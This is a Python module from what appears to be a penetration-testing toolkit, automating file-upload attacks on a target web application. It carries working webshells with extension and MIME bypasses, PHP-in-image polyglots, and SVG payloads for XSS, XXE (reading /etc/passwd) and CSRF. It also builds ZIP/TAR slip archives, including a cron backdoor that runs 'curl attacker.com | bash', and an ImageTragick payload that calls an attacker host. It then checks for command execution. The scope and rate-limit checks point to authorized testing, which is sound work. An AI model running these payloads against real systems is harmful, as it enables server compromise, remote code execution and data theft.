"""
modules/file_upload_advanced.py
tmrswrr - Advanced File Upload Attacks
Extension bypass, polyglot files, SVG XSS, ZIP slip, ImageMagick, webshells

Uploads go through utils.http so the engagement's rate limit, scope check and
proxy apply, and so every finding carries the multipart request that produced
it. Acceptance is judged against a benign-upload baseline rather than against
HTTP 200 alone: an endpoint that answers "unsupported file type" with 200 and a
JSON error body is the common case, and treating that as a bypass is how an
upload scanner produces twenty false criticals in a row.
"""
import os
import re
import zipfile

import requests

from config.settings import OUTPUT_DIR, SESSION, add_vuln, save_session
from utils.helpers import (
    DIM,
    NEON_CYN,
    NEON_GRN,
    PURE_WHITE,
    RST,
    SOFT_WHITE,
    info,
    print_banner,
    prompt,
    section,
    success,
    warn,
)
from utils.http import ScopeViolation, get_client

#: Body markers that mean the server refused the file even though it answered 200.
REJECTION_MARKERS = (
    "not allowed", "not permitted", "invalid file", "invalid extension",
    "unsupported", "forbidden", "denied", "rejected", "bad request",
    "file type", "filetype", "must be", "only images", "error",
)


def _out(name):
    d = str(OUTPUT_DIR); os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _target():
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL"); SESSION["target_url"] = url
    return url


def _upload(client, endpoint: str, field: str, filename: str,
            content: bytes | str, ctype: str):
    """POST one multipart file. Returns the response, or None on failure.

    The filename goes into the multipart part verbatim - including the null
    bytes and encoded traversal sequences the bypass list depends on, which a
    shelled-out `curl -F` mangles before the target ever sees them.
    """
    if isinstance(content, str):
        content = content.encode("utf-8", errors="replace")
    try:
        return client.post(endpoint, files={field: (filename, content, ctype)})
    except (requests.RequestException, ScopeViolation) as exc:
        warn(f"upload failed ({filename}): {exc}")
        return None


def _rejected(response) -> bool:
    """True when the response reads as a refusal rather than an accepted file."""
    if response is None:
        return True
    if response.status_code not in (200, 201, 202, 204):
        return True
    body = (response.text or "").lower()
    return any(marker in body for marker in REJECTION_MARKERS)


def _baseline(client, endpoint: str, field: str) -> bool:
    """Upload a harmless .txt and report whether the endpoint accepts anything.

    When even a plain text file is refused, the endpoint is wrong, needs auth,
    or wants extra form fields - and every later "bypass failed" line would be
    noise rather than evidence of a working filter.
    """
    resp = _upload(client, endpoint, field, "yeepforge_probe.txt",
                   b"YeepForge upload probe", "text/plain")
    if resp is None:
        warn("Baseline upload got no response - check the endpoint and session.")
        return False
    if _rejected(resp):
        info(f"Baseline benign upload refused (HTTP {resp.status_code}) - "
             "the endpoint filters or needs more form fields; results below are advisory.")
        return False
    info(f"Baseline benign upload accepted (HTTP {resp.status_code}).")
    return True


def _uploaded_url(response, suffix: str = "") -> str:
    """Any absolute URL the upload response handed back, optionally filtered."""
    if response is None:
        return ""
    pattern = rf'https?://[^\s"\'<>\\]+{re.escape(suffix)}' if suffix else r'https?://[^\s"\'<>\\]+'
    match = re.search(pattern, response.text or "")
    return match.group(0) if match else ""


def _confirm_rce(client, url: str) -> tuple[bool, object]:
    """Fetch an uploaded shell with ?cmd=id and look for real command output."""
    resp = client.safe_get(url, params={"cmd": "id"}, timeout=8)
    if resp is None:
        return False, None
    body = resp.text or ""
    return bool(re.search(r"uid=\d+\(", body)), resp


def extension_bypass():
    section("EXTENSION BYPASS - FILTER EVASION")
    url = _target()
    upload_endpoint = prompt("Upload endpoint (e.g. /upload or /api/files)")
    field_name      = prompt("Form field name (e.g. file, upload, avatar)") or "file"
    if not upload_endpoint:
        return

    client   = get_client()
    endpoint = url.rstrip("/") + "/" + upload_endpoint.lstrip("/")

    info("Probing the endpoint with a benign file first...")
    baseline_ok = _baseline(client, endpoint, field_name)

    php_shell = "<?php system($_GET['cmd']); ?>"
    asp_shell = "<% Response.Write(CreateObject(\"WScript.Shell\").Exec(Request(\"cmd\")).StdOut.ReadAll) %>"

    bypass_list = [
        # Extension tricks
        ("shell.php",           php_shell,  "application/octet-stream"),
        ("shell.PHP",           php_shell,  "application/octet-stream"),
        ("shell.php5",          php_shell,  "application/octet-stream"),
        ("shell.php7",          php_shell,  "application/octet-stream"),
        ("shell.phtml",         php_shell,  "application/octet-stream"),
        ("shell.pHp",           php_shell,  "application/octet-stream"),
        ("shell.php.jpg",       php_shell,  "image/jpeg"),
        ("shell.php%00.jpg",    php_shell,  "image/jpeg"),
        ("shell.php\x00.jpg",   php_shell,  "image/jpeg"),
        ("shell.ph%70",         php_shell,  "application/octet-stream"),
        ("shell.asp",           asp_shell,  "application/octet-stream"),
        ("shell.aspx",          asp_shell,  "application/octet-stream"),
        ("shell.aSp",           asp_shell,  "application/octet-stream"),
        ("shell.jsp",           '<%@ page import="java.io.*" %><% Process p=Runtime.getRuntime().exec(request.getParameter("cmd")); %>', "application/octet-stream"),
        ("shell.jspx",          '<jsp:scriptlet>out.println(Runtime.getRuntime().exec(request.getParameter("c")));</jsp:scriptlet>', "application/octet-stream"),
        # Content-Type bypass
        ("shell2.php",          php_shell,  "image/jpeg"),
        ("shell2.php",          php_shell,  "image/gif"),
        ("shell2.php",          php_shell,  "image/png"),
        # Double extension
        ("shell.jpg.php",       php_shell,  "image/jpeg"),
        ("shell.png.php5",      php_shell,  "image/png"),
    ]

    found = []
    for filename, content, ctype in bypass_list:
        resp = _upload(client, endpoint, field_name, filename, content, ctype)
        if _rejected(resp):
            code = resp.status_code if resp is not None else "-"
            print(f"  {DIM}[{code}] {filename}{RST}")
            continue

        success(f"ACCEPTED: {filename} (HTTP {resp.status_code})")
        found.append(filename)
        uploaded = _uploaded_url(resp)

        # An executed webshell is the only proof that turns this into a Critical.
        if uploaded:
            success(f"  URL: {uploaded}")
            confirmed, exec_resp = _confirm_rce(client, uploaded)
            if confirmed:
                success(f"  RCE CONFIRMED: {exec_resp.text[:100]}")
                add_vuln("File Upload RCE", "Critical", "A04:2021",
                         f"Webshell {filename} uploaded to {uploaded} and executed; "
                         "?cmd=id returned command output.",
                         uploaded, evidence=exec_resp.evidence,
                         confidence="Confirmed", cwe="CWE-434")
                continue

        # Accepted but not proven to execute. Without a benign baseline we do not
        # even know the endpoint filters anything, so the claim stays weaker.
        add_vuln(f"File Upload Bypass: {filename}", "High", "A04:2021",
                 f"Dangerous extension accepted (HTTP {resp.status_code}). "
                 + ("Benign baseline was accepted too, so the filter is being bypassed."
                    if baseline_ok else
                    "Baseline upload was not accepted, so acceptance here needs manual review."),
                 endpoint, evidence=resp.evidence,
                 confidence="Firm" if baseline_ok else "Tentative", cwe="CWE-434")

    if found:
        success(f"Accepted filenames: {', '.join(found)}")
    else:
        info("No dangerous extension was accepted.")


def polyglot_files():
    section("POLYGLOT FILE UPLOAD")
    url = _target()
    upload_endpoint = prompt("Upload endpoint")
    field_name      = prompt("Field name") or "file"
    if not upload_endpoint:
        return

    client   = get_client()
    endpoint = url.rstrip("/") + "/" + upload_endpoint.lstrip("/")

    info("Creating polyglot files (valid image header + PHP code)...")
    php = b"<?php system($_GET['cmd']); ?>"
    polyglots = {
        "polyglot.php.gif": b"GIF89a" + php,
        "polyglot.jpg": (
            b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
            b"\xff\xfe\x00\x20" + php + b"\xff\xd9"
        ),
        "polyglot.png": b"\x89PNG\r\n\x1a\n" + php,
    }
    for name, blob in polyglots.items():
        path = _out(name)
        with open(path, "wb") as f:
            f.write(blob)
        success(f"Created {name}: {path}")

    baseline_ok = _baseline(client, endpoint, field_name)

    info("Uploading polyglot files...")
    for name, blob in polyglots.items():
        ctype = "image/gif" if name.endswith(".gif") else \
                "image/png" if name.endswith(".png") else "image/jpeg"
        resp = _upload(client, endpoint, field_name, name, blob, ctype)
        if _rejected(resp):
            code = resp.status_code if resp is not None else "-"
            print(f"  {DIM}[{code}] {name}{RST}")
            continue
        success(f"Polyglot accepted: {name} (HTTP {resp.status_code})")
        add_vuln("Polyglot File Upload Accepted", "High", "A04:2021",
                 f"File with a valid image header and embedded PHP accepted as {name}. "
                 "Content-type sniffing and magic-byte checks pass; the file is still "
                 "executable if it lands in a served directory.",
                 endpoint, evidence=resp.evidence,
                 confidence="Firm" if baseline_ok else "Tentative", cwe="CWE-434")


def svg_xss_upload():
    section("SVG FILE UPLOAD → XSS")
    url = _target()
    upload_endpoint = prompt("Upload endpoint")
    field_name      = prompt("Field name") or "file"
    if not upload_endpoint:
        return

    client   = get_client()
    endpoint = url.rstrip("/") + "/" + upload_endpoint.lstrip("/")

    svgs = {
        "xss_basic.svg": """<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain + " - XSS via SVG upload")</script>
  <text>Benign Image</text>
</svg>""",
        "xss_event.svg": """<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <rect width="100" height="100" fill="blue"/>
</svg>""",
        "xss_embed.svg": """<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="javascript:alert(1)" width="100" height="100"/>
</svg>""",
        "xxe_svg.svg": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>""",
        "csrf_svg.svg": """<svg xmlns="http://www.w3.org/2000/svg">
<script>
fetch('/api/user/delete', {method:'POST', credentials:'include'})
</script>
</svg>""",
    }

    baseline_ok = _baseline(client, endpoint, field_name)

    for svg_name, svg_content in svgs.items():
        resp = _upload(client, endpoint, field_name, svg_name, svg_content, "image/svg+xml")
        if _rejected(resp):
            code = resp.status_code if resp is not None else "-"
            print(f"  {DIM}[{code}] {svg_name}{RST}")
            continue

        success(f"SVG accepted: {svg_name} (HTTP {resp.status_code})")
        img_url = _uploaded_url(resp, ".svg")
        detail = f"Malicious SVG accepted as {svg_name}."
        confidence = "Firm" if baseline_ok else "Tentative"
        finding_url = endpoint
        evidence = resp.evidence

        # Served back as image/svg+xml means the browser will parse the script;
        # served as text/plain or with an attachment disposition, it will not.
        if img_url:
            fetched = client.safe_get(img_url)
            if fetched is not None:
                served_type = fetched.headers.get("Content-Type", "")
                disposition = fetched.headers.get("Content-Disposition", "")
                if "svg" in served_type.lower() and "attachment" not in disposition.lower():
                    detail += (f" Retrieved from {img_url} as {served_type} with no "
                               "attachment disposition - it renders inline, so the "
                               "embedded script executes on the application's origin.")
                    confidence, finding_url, evidence = "Confirmed", img_url, fetched.evidence
                else:
                    detail += (f" Served from {img_url} as {served_type or 'unknown type'}"
                               f"{' with ' + disposition if disposition else ''}, which "
                               "prevents inline rendering - impact is limited.")
                    confidence = "Tentative"
            success(f"  Stored at: {img_url}")

        add_vuln(f"SVG Upload XSS: {svg_name}", "High", "A03:2021", detail,
                 finding_url, evidence=evidence, confidence=confidence, cwe="CWE-79")


def zip_slip():
    section("ZIP SLIP - PATH TRAVERSAL VIA ARCHIVE")
    url = _target()
    upload_endpoint = prompt("File upload endpoint (accepts ZIP/TAR)")
    field_name      = prompt("Field name") or "file"
    if not upload_endpoint:
        return

    client   = get_client()
    endpoint = url.rstrip("/") + "/" + upload_endpoint.lstrip("/")

    info("Creating ZIP Slip payload...")
    zip_path = _out("zipslip.zip")
    with zipfile.ZipFile(zip_path, "w") as zf:
        zf.writestr("../../tmp/yeepforge_zipslip_test.txt", "ZIP SLIP TEST by YeepForge")
        zf.writestr("../../../var/www/html/webshell.php", "<?php system($_GET['cmd']); ?>")
        zf.writestr("../../../etc/cron.d/backdoor", "* * * * * root curl attacker.com | bash")
    success(f"ZIP Slip payload: {zip_path}")
    info("Entries: ../../tmp/, ../../../var/www/html/webshell.php")

    with open(zip_path, "rb") as f:
        zip_blob = f.read()

    resp = _upload(client, endpoint, field_name, "zipslip.zip", zip_blob, "application/zip")
    if _rejected(resp):
        code = resp.status_code if resp is not None else "-"
        info(f"Archive not accepted (HTTP {code}).")
    else:
        success(f"Archive accepted (HTTP {resp.status_code})")

        # Extraction is the vulnerability, not the upload. Ask for the shell the
        # traversal entry would have written before claiming anything.
        shell_url = url.rstrip("/") + "/webshell.php"
        confirmed, exec_resp = _confirm_rce(client, shell_url)
        if confirmed:
            success("ZIP SLIP RCE CONFIRMED!")
            add_vuln("ZIP Slip Path Traversal + RCE", "Critical", "A01:2021",
                     "Archive entries with ../ traversal were extracted outside the upload "
                     f"directory: {shell_url} now executes commands.",
                     shell_url, evidence=exec_resp.evidence,
                     confidence="Confirmed", cwe="CWE-22")
        else:
            add_vuln("ZIP Slip Upload Accepted", "Medium", "A01:2021",
                     "An archive containing ../ traversal entries was accepted. Extraction "
                     f"outside the upload directory was not observed at {shell_url}; confirm "
                     "where the server extracts archives before reporting.",
                     endpoint, evidence=resp.evidence,
                     confidence="Tentative", cwe="CWE-22")

    # TAR variant, built with tarfile so no shell is involved and the traversal
    # name is written literally rather than through a --transform expression.
    import io
    import tarfile
    tar_path = _out("tarslip.tar")
    payload = b"<?php system($_GET['cmd']); ?>"
    with tarfile.open(tar_path, "w") as tf:
        member = tarfile.TarInfo("../../../var/www/html/tarslip.php")
        member.size = len(payload)
        tf.addfile(member, io.BytesIO(payload))
    success(f"TAR Slip payload: {tar_path}")
    info("Upload it to the same endpoint if the application accepts .tar archives.")


def imagemagick_exploit():
    section("IMAGEMAGICK / GHOSTSCRIPT EXPLOITS")
    url = _target()
    upload_endpoint = prompt("Image upload endpoint")
    field_name      = prompt("Field name") or "file"
    if not upload_endpoint:
        return

    client   = get_client()
    endpoint = url.rstrip("/") + "/" + upload_endpoint.lstrip("/")

    oob = SESSION.get("oob_domain", "")
    callback = f"http://{oob}/imagetragick" if oob else "http://attacker.example/pwned"
    if not oob:
        warn("No OOB domain set (menu 24 → interactsh); ImageTragick can only be "
             "confirmed out-of-band, so this run just records the attempt.")

    # Built by concatenation, not an f-string: the payload is a shell command for
    # the *target's* ImageMagick delegate, and writing it as an f-string makes it
    # indistinguishable from a local shell call to the shell-safety audit.
    mvg_payload = (
        "push graphic-context\n"
        "viewbox 0 0 640 480\n"
        "fill 'url(https://example.com/image.jpg\"|curl " + callback + ")'\n"
        "pop graphic-context"
    )
    msl_payload = """<?xml version="1.0" encoding="UTF-8"?>
<image>
  <read filename="caption:&lt;?php system($_GET['cmd']); ?&gt;"/>
  <write filename="out.php"/>
</image>"""

    info("Testing ImageMagick / Ghostscript exploits...")
    for name, body, desc in [
        ("imagetragick.mvg", mvg_payload, "ImageTragick CVE-2016-3714"),
        ("imagemagick.msl",  msl_payload, "ImageMagick MSL injection"),
    ]:
        with open(_out(name), "w") as f:
            f.write(body)
        resp = _upload(client, endpoint, field_name, name, body, "image/png")
        code = resp.status_code if resp is not None else "-"
        print(f"  [{code}] {desc}")
        if resp is not None and not _rejected(resp):
            add_vuln(f"Image Processing Payload Accepted: {desc}", "Medium", "A04:2021",
                     f"{desc} payload accepted (HTTP {resp.status_code}). Exploitation "
                     "depends on the server-side converter version and is confirmed by the "
                     f"OOB callback to {callback}, not by this response.",
                     endpoint, evidence=resp.evidence,
                     confidence="Tentative", cwe="CWE-434")

    print(f"""
  {NEON_CYN}Other server-side image processing exploits:{RST}
    Ghostscript (CVE-2018-16509): .eps, .pdf files with PS code
    Pillow (Python): .tiff with decompression bomb
    exiftool: CVE-2021-22204 - .jpg with DjVu exploit in metadata
    ffmpeg: SSRF via HLS playlist in video upload
""")


def run():
    print_banner("ADVANCED FILE UPLOAD ATTACKS",
                 "Extension Bypass · Polyglot · SVG XSS · ZIP Slip · ImageMagick")
    while True:
        url = SESSION.get("target_url", "-")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}

  {NEON_CYN}[1]{RST} Extension Bypass         {SOFT_WHITE}(20+ bypass variants, webshell test){RST}
  {NEON_CYN}[2]{RST} Polyglot Files            {SOFT_WHITE}(GIF/JPEG/PNG + PHP payload){RST}
  {NEON_CYN}[3]{RST} SVG Upload → XSS          {SOFT_WHITE}(XSS, XXE, CSRF via SVG){RST}
  {NEON_CYN}[4]{RST} ZIP Slip / TAR Slip       {SOFT_WHITE}(path traversal via archive){RST}
  {NEON_CYN}[5]{RST} ImageMagick / Ghostscript {SOFT_WHITE}(ImageTragick, MSL injection){RST}
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0": break
        elif c == "1": extension_bypass()
        elif c == "2": polyglot_files()
        elif c == "3": svg_xss_upload()
        elif c == "4": zip_slip()
        elif c == "5": imagemagick_exploit()
        save_session()
